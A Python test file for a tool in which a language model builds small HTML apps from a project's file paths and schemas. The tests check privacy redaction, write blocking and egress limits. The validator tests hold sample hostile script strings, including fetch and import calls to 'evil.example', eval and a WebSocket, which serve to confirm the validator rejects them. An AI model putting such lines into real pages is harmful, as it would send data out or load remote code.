"""An ad-hoc app is built from paths and schemas, then kept or discarded."""

from __future__ import annotations

import json
from collections.abc import Callable
from pathlib import Path

import pytest

from iterthink.services.app_validate import bridge_reference, problems
from iterthink.services.bridge import Forbidden, Invalid, NotFound
from iterthink.services.bridge_real import RealBridge
from iterthink.services.event_log import read_all

_HTML = "<main><h1>Doors</h1><script>bridge.listFiles()</script></main>"
_BODY = "Die Türen im EG sind EI30."


class _Model:
    def __init__(self, replies: list[str], tier: str = "local") -> None:
        self.replies = list(replies)
        self.tier = tier
        self.seen: list[tuple[str, str]] = []

    def complete(self, system: str, user: str, tier: str) -> str:
        self.seen.append((system, user))
        assert tier
        if not self.replies:
            return "no"
        return self.replies.pop(0)


def _bridge(tmp_path: Path) -> RealBridge:
    return RealBridge(state_dir=tmp_path / "state", machine="m-test")


def _good(html: str = _HTML, slug: str = "door-notes", module: str = "") -> str:
    body: dict[str, object] = {
        "slug": slug,
        "title": "Door notes",
        "purpose": "list doors",
        "inputs": ["Türliste.csv"],
        "html": html,
    }
    if module:
        body["module"] = module
    return json.dumps(body)
    return json.dumps(
        {
            "slug": slug,
            "title": "Door notes",
            "purpose": "list doors",
            "inputs": ["Türliste.csv"],
            "html": html,
        }
    )


def _dict(value: object) -> dict[str, object]:
    assert isinstance(value, dict)
    return value


def _tier(project_dir: Path, tier: str) -> None:
    folder = project_dir / ".iterthink" / "settings"
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "values.yaml").write_text(f"apps.builder_tier: {tier}\n", encoding="utf-8")


def test_builder_prompt_contains_structure_never_content(tmp_path: Path, project_dir: Path) -> None:
    (project_dir / "People.md").write_text(
        "# Contact ada@example.com\n\nSECRET_BODY_9f3a stays in the file.\n",
        encoding="utf-8",
    )
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    model = _Model([_good()])
    bridge.use_app_model(model)
    bridge.app_build(project, "clean the door list", "user:ada")
    system, user = model.seen[0]
    for heading in ("Rules", "Bridge reference", "Component reference", "Example apps"):
        assert heading in system
    assert "Türliste.csv" in user
    assert "brandschutz" in user
    assert "T01" not in user
    assert _BODY not in user
    assert "SECRET_BODY_9f3a" not in user
    assert "SECRET_BODY_9f3a" not in system


def test_bridge_reference_is_generated_from_bridge_py() -> None:
    source = Path("iterthink/services/bridge.py").read_text(encoding="utf-8")
    text = bridge_reference()
    assert "def propose(" in source
    assert "untouched" in source
    assert "propose(" in text
    assert "untouched" in text
    assert "readFile(" in text
    seed = Path("iterthink/defaults/app_builder.md").read_text(encoding="utf-8")
    assert "def propose(" not in seed
    assert "untouched" not in seed


def test_schemas_pass_privacy_shield_before_remote_call(tmp_path: Path, project_dir: Path) -> None:
    (project_dir / "People.md").write_text(
        "# Contact ada@example.com\n\nSECRET_BODY_9f3a\n",
        encoding="utf-8",
    )
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    _tier(project_dir, "cloud")
    model = _Model([_good()], tier="cloud")
    bridge.use_app_model(model)
    bridge.app_build(project, "list the files", "user:ada")
    user = model.seen[0][1]
    assert "ada@example.com" not in user
    assert "EMAIL" in user
    assert "SECRET_BODY_9f3a" not in user


def test_validation_rejects_external_urls_and_eval() -> None:
    fetched = problems("<script>fetch('https://evil.example/x')</script>")
    assert fetched
    evaluated = problems("<script>eval('1')</script>")
    assert any("eval" in item for item in evaluated)
    remote = problems('<script src="https://cdn.example/app.js"></script>')
    assert remote
    function = problems("<script>new Function('return 1')</script>")
    assert function
    allowed = problems('<script src="/static/vendor/htmx-2.0.11.min.js"></script>')
    assert allowed == []


def test_three_attempts_then_plain_error(tmp_path: Path, project_dir: Path) -> None:
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    model = _Model(["nope", "still nope", "<script>eval(1)</script>"])
    bridge.use_app_model(model)
    with pytest.raises(Invalid, match="3 attempts"):
        bridge.app_build(project, "make a tool", "user:ada")
    assert len(model.seen) == 3
    events = [event for event in read_all(project_dir) if event.type == "app"]
    assert events[-1].payload["attempts"] == 3


def test_keep_and_discard_move_files(tmp_path: Path, project_dir: Path) -> None:
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    bridge.use_app_model(_Model([_good()]))
    info = bridge.app_build(project, "list doors", "user:ada")
    folder = project_dir / ".iterthink" / "apps" / info.id
    assert (folder / "index.html").is_file()
    kept = bridge.app_keep(project, info.id, "user:ada")
    assert kept.status == "kept"
    assert "kept" in (folder / "manifest.yaml").read_text(encoding="utf-8")
    listed = bridge.apps(project)
    assert listed[0].id == info.id
    discarded = bridge.app_discard(project, info.id, "user:ada")
    assert discarded.status == "discarded"
    assert not folder.exists()
    archive = project_dir / ".iterthink" / "apps" / ".archive" / info.id
    assert (archive / "index.html").is_file()
    assert (archive / "manifest.yaml").is_file()
    assert bridge.apps(project) == []


def test_build_under_egress_none_sends_no_content(tmp_path: Path, project_dir: Path) -> None:
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    bridge.set_egress(project, "none", "user:ada")
    _tier(project_dir, "cloud")
    model = _Model([_good()], tier="cloud")
    bridge.use_app_model(model)
    with pytest.raises(Forbidden, match="egress blocks app_build"):
        bridge.app_build(project, "summarise the files", "user:ada")
    assert model.seen == []
    assert (project_dir / "Türliste.csv").read_text(encoding="utf-8").startswith("id,")


def test_build_is_logged_with_attempts(tmp_path: Path, project_dir: Path) -> None:
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    bridge.use_app_model(_Model(["nope", _good()]))
    info = bridge.app_build(project, "list doors", "user:ada")
    events = [event for event in read_all(project_dir) if event.type == "app"]
    payload = events[-1].payload
    assert payload["action"] == "build"
    assert payload["attempts"] == 2
    assert payload["slug"] == info.id
    assert isinstance(payload["prompt"], str)
    assert payload["prompt"]
    assert payload["model"] == "local"
    bridge.app_keep(project, info.id, "user:ada")
    kinds = [event.payload["action"] for event in read_all(project_dir) if event.type == "app"]
    assert "keep" in kinds


def test_example_apps_run(
    tmp_path: Path, project_dir: Path, source_snapshot: Callable[[Path], dict[str, str]]
) -> None:
    before = source_snapshot(project_dir)
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    for slug in ("spec-check", "csv-cleanup"):
        bridge.install_example(project, slug)
        assert (
            problems((project_dir / ".iterthink" / "apps" / slug / "index.html").read_text()) == []
        )
    diff = _dict(
        bridge.app_call(project, "spec-check", "compare", {"path": "Pflichtenheft.md"}, "user:ada")
    )
    assert diff["path"] == "Pflichtenheft.md"
    read = _dict(
        bridge.app_call(project, "csv-cleanup", "readFile", {"path": "Türliste.csv"}, "user:ada")
    )
    assert "brandschutz" in str(read.get("text"))
    proposed = _dict(
        bridge.app_call(
            project,
            "csv-cleanup",
            "propose",
            {"changes": {"clean.csv": "id\n"}, "reason": "clean the table"},
            "user:ada",
        )
    )
    assert str(proposed.get("id", "")).startswith("pr-")
    assert not (project_dir / "clean.csv").exists()
    blocked = _dict(
        bridge.app_call(
            project, "csv-cleanup", "save", {"path": "Türliste.csv", "text": "nope"}, "user:ada"
        )
    )
    assert "propose" in str(blocked.get("error"))
    assert source_snapshot(project_dir) == before


def test_app_cannot_write_files_only_propose(tmp_path: Path, project_dir: Path) -> None:
    original = (project_dir / "Türliste.csv").read_text(encoding="utf-8")
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    bridge.use_app_model(_Model([_good()]))
    info = bridge.app_build(project, "list doors", "user:ada")
    blocked = _dict(
        bridge.app_call(
            project, info.id, "writeFile", {"path": "Türliste.csv", "text": "changed"}, "user:ada"
        )
    )
    assert blocked.get("error")
    assert (project_dir / "Türliste.csv").read_text(encoding="utf-8") == original
    made = _dict(
        bridge.app_call(
            project,
            info.id,
            "propose",
            {"changes": {"Türliste.csv": "id\n"}, "reason": "shorten the table"},
            "user:ada",
        )
    )
    assert str(made.get("status")) == "open"
    assert (project_dir / "Türliste.csv").read_text(encoding="utf-8") == original


def test_edges_cover_retries_calls_and_lifecycle(tmp_path: Path, project_dir: Path) -> None:
    (project_dir / "notes.txt").write_text("plain note\n", encoding="utf-8")
    (project_dir / "empty.md").write_text("", encoding="utf-8")
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    with pytest.raises(Invalid, match="builder"):
        bridge.app_build(project, "list doors", "user:ada")
    with pytest.raises(NotFound):
        bridge.install_example(project, "missing")
    boom = _Model([_good(module="const n = 1;\n")])

    def _raise(system: str, user: str, tier: str) -> str:
        raise RuntimeError(system or tier or user)

    boom.complete = _raise  # type: ignore[method-assign]
    bridge.use_app_model(boom)
    with pytest.raises(Invalid, match="3 attempts"):
        bridge.app_build(project, "list doors", "user:ada")
    bridge.use_app_model(_Model([_good(module="const n = 1;\n"), _good(slug="Door Notes!")]))
    first = bridge.app_build(project, "list doors", "user:ada")
    assert (project_dir / ".iterthink" / "apps" / first.id / "module.js").is_file()
    second = bridge.app_build(project, "list doors", "user:ada")
    assert second.id != first.id
    files = bridge.app_call(project, first.id, "listFiles", {}, "user:ada")
    assert isinstance(files, list)
    assert files
    history = bridge.app_call(project, first.id, "history", {"path": "Türliste.csv"}, "user:ada")
    assert isinstance(history, list)
    found = bridge.app_call(
        project, first.id, "search", {"query": "EI30", "limit": True}, "user:ada"
    )
    assert isinstance(found, list)
    missing = _dict(bridge.app_call(project, first.id, "readFile", {}, "user:ada"))
    assert missing.get("error")
    absent = _dict(bridge.app_call(project, first.id, "readFile", {"path": "nope.md"}, "user:ada"))
    assert absent.get("error")
    compared = _dict(bridge.app_call(project, first.id, "compare", {}, "user:ada"))
    assert compared.get("error")
    refused = _dict(
        bridge.app_call(project, first.id, "propose", {"changes": [], "reason": " "}, "user:ada")
    )
    assert refused.get("error")


def test_edges_keep_revise_and_shield(tmp_path: Path, project_dir: Path) -> None:
    (project_dir / "People.md").write_text("# Contact ada@example.com\n\nbody\n", encoding="utf-8")
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    _tier(project_dir, "nope")
    model = _Model([_good(), _good(slug="next-tool", html="<main><p>Next</p></main>")])
    bridge.use_app_model(model)
    first = bridge.app_build(project, "list doors", "user:ada")
    bridge.app_keep(project, first.id, "user:ada")
    hidden = bridge.app_close(project, first.id)
    assert hidden.status == "kept"
    assert bridge.apps(project)[0].id == first.id
    _tier(project_dir, "company")
    follow = bridge.app_build(project, "list doors again", "user:ada")
    assert "list doors" in model.seen[-1][1]
    assert "ada@example.com" not in model.seen[-1][1]
    bridge.use_app_model(_Model([_good(html="<main><p>Changed</p></main>")]))
    proposal = bridge.app_revise(project, follow.id, "rename the heading", "user:ada")
    assert proposal.startswith("pr-")
    page = project_dir / ".iterthink" / "apps" / follow.id / "index.html"
    assert "Next" in page.read_text(encoding="utf-8")
    bridge.accept(project, proposal, "user:ada", "rename the heading")
    assert "Changed" in page.read_text(encoding="utf-8")
    bridge.app_discard(project, follow.id, "user:ada")
    bridge.use_app_model(_Model([_good(slug=follow.id)]))
    again = bridge.app_build(project, "list doors", "user:ada")
    bridge.app_discard(project, again.id, "user:ada")
    archive = project_dir / ".iterthink" / "apps" / ".archive"
    assert (archive / f"{again.id}-2").is_dir() or (archive / again.id).is_dir()


def test_edges_validation_and_bad_reply(tmp_path: Path, project_dir: Path) -> None:
    from iterthink.services.app_calls import perform
    from iterthink.services.app_validate import parse_build

    assert problems("<script>new WebSocket('ws://x')</script>")
    assert problems("import('https://evil.example/a.js')")
    assert problems("<script>bridge.save()</script>")
    assert problems("x" * 200_001)
    assert parse_build('["no"]') is None
    bad_inputs = '{"slug":"a","title":"t","purpose":"p","html":"<p></p>","inputs":"no"}'
    assert parse_build(bad_inputs) is None
    bridge = _bridge(tmp_path)
    project = bridge.make_project(project_dir).id
    missing = _good(html="<script>bridge.readFile('missing.txt')</script>")
    bridge.use_app_model(_Model([missing, missing, missing]))
    with pytest.raises(Invalid, match="3 attempts"):
        bridge.app_build(project, "list doors", "user:ada")
    bridge.use_app_model(_Model([_good()]))
    info = bridge.app_build(project, "list doors", "user:ada")
    recorded = perform(
        bridge,
        project,
        "propose",
        {"changes": {"note.md": "x", "n": 1}, "reason": "note"},
        "user:ada",
        dry=True,
    )
    assert _dict(recorded).get("recorded") is True
    bridge.use_app_model(_Model(["nope"]))
    with pytest.raises(Invalid, match="JSON"):
        bridge.app_revise(project, info.id, "change it", "user:ada")
    bridge.use_app_model(
        _Model(['{"slug":"a","title":"t","purpose":"p","html":"<script>eval(1)</script>"}'])
    )
    with pytest.raises(Invalid, match="valid"):
        bridge.app_revise(project, info.id, "", "user:ada")
